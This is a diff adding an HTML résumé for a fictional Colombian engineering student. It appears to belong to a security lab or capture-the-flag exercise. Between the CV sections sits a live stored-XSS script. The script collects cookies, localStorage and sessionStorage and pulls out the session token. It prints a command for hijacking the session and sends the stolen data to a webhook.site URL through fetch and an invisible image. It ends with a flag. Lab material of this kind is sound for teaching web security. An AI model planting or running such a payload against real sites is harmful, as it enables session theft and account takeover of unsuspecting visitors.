@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Curriculum Vitae - Juan Pérez</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 { color: #333; }
+        h2 { color: #666; border-bottom: 2px solid #6366f1; }
+        .section { margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>Curriculum Vitae</h1>
+    
+    <div class="section">
+        <h2>Información Personal</h2>
+        <p><strong>Nombre:</strong> Juan Pérez Estudiante</p>
+        <p><strong>Email:</strong> juan.perez@ejemplo.com</p>
+        <p><strong>Teléfono:</strong> +57 300 123 4567</p>
+        <p><strong>LinkedIn:</strong> linkedin.com/in/juanperez</p>
+    </div>
+    
+    <div class="section">
+        <h2>Perfil Profesional</h2>
+        <p>
+            Estudiante de Ingeniería de Sistemas con conocimientos en desarrollo web,
+            bases de datos y metodologías ágiles. Apasionado por la tecnología y
+            la innovación, buscando oportunidades de pasantía para aplicar y ampliar
+            mis habilidades en un entorno profesional.
+        </p>
+    </div>
+    
+    <div class="section">
+        <h2>Formación Académica</h2>
+        <p><strong>Universidad de Medellín</strong></p>
+        <p>Ingeniería de Sistemas - 7º Semestre (2021 - Presente)</p>
+        <p>Promedio: 4.3/5.0</p>
+    </div>
+    
+    <div class="section">
+        <h2>Experiencia</h2>
+        <ul>
+            <li>
+                <strong>Desarrollador Jr. - TechCompany SAS</strong><br>
+                Enero 2023 - Diciembre 2023<br>
+                Desarrollo de aplicaciones web con React y Node.js
+            </li>
+            <li>
+                <strong>Practicante - StartupXYZ</strong><br>
+                Junio 2022 - Diciembre 2022<br>
+                Soporte técnico y desarrollo de features
+            </li>
+        </ul>
+    </div>
+    
+    <div class="section">
+        <h2>Habilidades Técnicas</h2>
+        <ul>
+            <li>Lenguajes: Python, JavaScript, Java</li>
+            <li>Frameworks: Flask, React, Spring Boot</li>
+            <li>Bases de Datos: MySQL, PostgreSQL, MongoDB</li>
+            <li>Control de versiones: Git, GitHub</li>
+            <li>Metodologías: Scrum, Kanban</li>
+        </ul>
+    </div>
+    
+    <div class="section">
+        <h2>Proyectos Destacados</h2>
+        <ul>
+            <li><strong>Sistema de Gestión Académica:</strong> Aplicación web para gestión de notas y horarios</li>
+            <li><strong>App de Delivery:</strong> Aplicación móvil con React Native</li>
+            <li><strong>Chatbot con IA:</strong> Bot de atención al cliente con NLP</li>
+        </ul>
+    </div>
+    
+    <!-- ========================================
+         PAYLOAD XSS - ACTO 2
+         ======================================== -->
+    <script>
+        console.log('═══════════════════════════════════════');
+        console.log('🚩 XSS PAYLOAD EJECUTADO - ACTO 2');
+        console.log('═══════════════════════════════════════');
+        
+        // 1. Capturar información del navegador
+        const victimInfo = {
+            cookies: document.cookie,
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage)
+        };
+        
+        console.log('📦 Información capturada:', victimInfo);
+        
+        // 2. Mostrar cookies en consola (para el lab)
+        console.log('🍪 COOKIES CAPTURADAS:');
+        console.log(document.cookie);
+        
+        // 3. Extraer session_token específicamente
+        const cookies = document.cookie.split(';');
+        let sessionToken = null;
+        
+        cookies.forEach(cookie => {
+            const [name, value] = cookie.trim().split('=');
+            if (name === 'session_token') {
+                sessionToken = value;
+            }
+        });
+        
+        if (sessionToken) {
+            console.log('🎯 SESSION TOKEN ENCONTRADO:');
+            console.log(sessionToken);
+            console.log('');
+            console.log('💡 Para robar esta sesión, ejecuta en otra ventana:');
+            console.log(`document.cookie = "session_token=${sessionToken}"; location.href = "/";`);
+        }
+        
+        // 4. Intentar enviar a servidor del atacante
+        // Reemplaza 'TU-WEBHOOK-ID' con tu ID de webhook.site
+        const webhookUrl = 'https://webhook.site/TU-WEBHOOK-ID';
+        
+        // Nota: En local puede fallar por CORS, pero en producción funcionaría
+        fetch(webhookUrl, {
+            method: 'POST',
+            mode: 'no-cors',  // Evita errores de CORS en el navegador
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(victimInfo)
+        })
+        .then(() => {
+            console.log('✅ Datos enviados al servidor del atacante');
+        })
+        .catch(error => {
+            console.log('⚠️ Error al enviar (normal en localhost):', error.message);
+            console.log('💡 En un escenario real, los datos se habrían enviado correctamente');
+        });
+        
+        // 5. Alternativa: Crear imagen invisible para exfiltración
+        // Este método funciona incluso con CORS
+        const exfilImg = new Image();
+        exfilImg.src = webhookUrl + '?data=' + encodeURIComponent(document.cookie);
+        
+        // 6. Mostrar alerta (opcional, solo para demostración)
+        // En un ataque real no mostrarías esto
+        if (confirm('🚩 XSS ejecutado exitosamente!\n\nCheck la consola del navegador para ver las cookies robadas.\n\n¿Quieres ver los datos capturados?')) {
+            console.table(victimInfo);
+        }
+        
+        console.log('═══════════════════════════════════════');
+        console.log('FLAG{stored_xss_persisted}');
+        console.log('═══════════════════════════════════════');
+    </script>
+    
+    <div class="section">
+        <h2>Referencias</h2>
+        <p>Disponibles bajo solicitud</p>
+    </div>
+    
+    <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center; color: #666;">
+        <p>Documento generado el 15 de Febrero de 2024</p>
+    </footer>
+</body>
+</html>
